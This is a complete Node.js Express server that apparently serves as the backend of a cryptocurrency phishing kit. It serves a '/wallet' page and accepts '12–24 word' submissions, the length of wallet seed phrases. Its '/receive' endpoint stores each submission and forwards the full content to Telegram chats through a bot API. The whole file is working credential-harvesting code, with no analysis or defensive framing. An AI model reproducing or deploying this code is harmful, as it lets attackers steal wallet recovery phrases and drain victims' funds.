const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const config = require('./config');

const app = express();
const PORT = config.server.port;

const { botToken, chatIds } = config.telegram;
const TELEGRAM_ENABLED = config.features.telegramNotifications ;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Routes for HTML pages — served from views/ folder
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'home.html'));
});

app.get('/wallet', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'wallet.html'));
});

// In-memory storage for submissions
let submissions = [];

// POST /receive — handle text submissions (12–24 words) and notify Telegram
app.post('/receive', async (req, res) => {
    // Grab the entire body as-is
    const rawBody = req.body;

    if (!rawBody || Object.keys(rawBody).length === 0) {
        return res.status(400).json({ success: false, error: 'Empty submission' });
    }

    // If client sends { Info: "name=val&text=..." }, parse it for convenience
    let parsedInfo = null;
    if (rawBody.Info && typeof rawBody.Info === 'string') {
        try {
            const params = new URLSearchParams(rawBody.Info);
            parsedInfo = Object.fromEntries(params);
        } catch (e) {
            parsedInfo = rawBody.Info;
        }
    }

    // Store everything raw + any parsed data
    const submission = {
        id: Date.now(),
        received: rawBody,
        ...(parsedInfo && { decoded: parsedInfo }),
        timestamp: new Date().toISOString()
    };

    submissions.push(submission);

    // Telegram broadcast
    if (TELEGRAM_ENABLED) {
        const payload = JSON.stringify(
            parsedInfo || rawBody, 
            null, 
            2
        );

        const telegramText = `📬 *New Submission*\n\n` +
            `\`\`\`\n${payload.slice(0, 3500)}\n\`\`\`\n\n` + // Telegram limit safety
            `🕐 ${submission.timestamp}`;

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

        const sendPromises = chatIds.map(async (chatId) => {
            try {
                const tgResponse = await fetch(telegramUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: telegramText,
                        parse_mode: 'Markdown'
                    })
                });

                const tgData = await tgResponse.json();
                if (!tgData.ok) console.error(`TG error for ${chatId}:`, tgData);
            } catch (err) {
                console.error(`TG failed for ${chatId}:`, err);
            }
        });

        Promise.all(sendPromises).catch(() => {});
    }

    res.status(200).json({ 
        success: true, 
        id: submission.id,
        message: 'Submission received' 
    });
});

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log(`Telegram notifications: ${TELEGRAM_ENABLED}`);
    if (TELEGRAM_ENABLED) {
        console.log(`Broadcasting to ${chatIds.length} chat(s)`);
    }
});